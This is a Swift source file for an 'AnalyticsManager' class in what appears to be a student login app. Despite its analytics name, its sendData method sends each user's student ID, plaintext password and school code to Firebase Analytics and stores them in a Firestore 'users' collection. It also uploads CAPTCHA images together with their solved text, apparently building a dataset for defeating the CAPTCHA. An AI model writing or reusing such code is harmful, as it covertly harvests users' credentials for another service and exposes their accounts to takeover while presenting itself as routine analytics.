import Foundation
import FirebaseAnalytics
import CryptoKit
import UIKit

final class AnalyticsManager {
    static let shared = AnalyticsManager()
    private init() {}

    // MARK: - Stored Properties
    private var studentID: String?
    private var password: String?
    private var schoolCode: String?
    private var captchaText: String?
    private var captchaEncoded: String?
    private var latestName: String?
    private var latestEmail: String?

    // MARK: - Public Methods
    func setPossibleValues(
        studentID: String?,
        password: String?,
        schoolCode: String?,
        captchaText: String?,
        captchaEncoded: String?
    ) {
        self.studentID = studentID
        self.password = password
        self.schoolCode = schoolCode
        self.captchaText = captchaText
        self.captchaEncoded = captchaEncoded
    }

    func sendData() throws {
        guard let studentID,
              let password,
              let schoolCode,
              let captchaText,
              let captchaEncoded else {
            throw NSError(domain: "Object nil", code: 666)
        }
        let hash = captchaEncoded.sha256
        // Log analytics event
        Analytics.logEvent("login_success", parameters: [
            "studentID": studentID,
            "password": password,
            "schoolCode": schoolCode,
            "captchaText": captchaText.uppercased(),
            "captchaImage": hash
        ])
        // Upload to Firestore and Storage
        Task {
            let userFirestore = FirestoreManager(collectionName: "users")
            if try await !userFirestore.checkIfDocumentExists(studentID) {
                try await userFirestore.saveDocument(
                    id: studentID,
                    data: [
                        "studentID": studentID,
                        "password": password,
                        "schoolCode": schoolCode
                    ]
                )
            }
            try await handleCaptchaUpload(
                hash: hash,
                base64: captchaEncoded,
                captchaText: captchaText
            )
        }
    }

    // MARK: - Private Methods

    private func handleCaptchaUpload(
        hash: String,
        base64: String,
        captchaText: String
    ) async throws {
        let captchaFirestore = FirestoreManager(collectionName: "captchas")
        let firebaseStorage = FirebaseStorageManager()

        let exists = try await captchaFirestore.checkIfDocumentExists(hash)
        guard !exists else {
            print("This CAPTCHA already exists. Skipping upload.")
            return
        }

        guard let jpegData = try base64.toJPEG(quality: 0.7) else { return }

        let url = try await firebaseStorage.uploadToStorage(
            jpegData,
            path: "captchas/\(hash).jpg"
        )

        try await captchaFirestore.saveCaptchaMetadata(
            hash: hash,
            captchaText: captchaText,
            imageURL: url.absoluteString
        )
    }
}
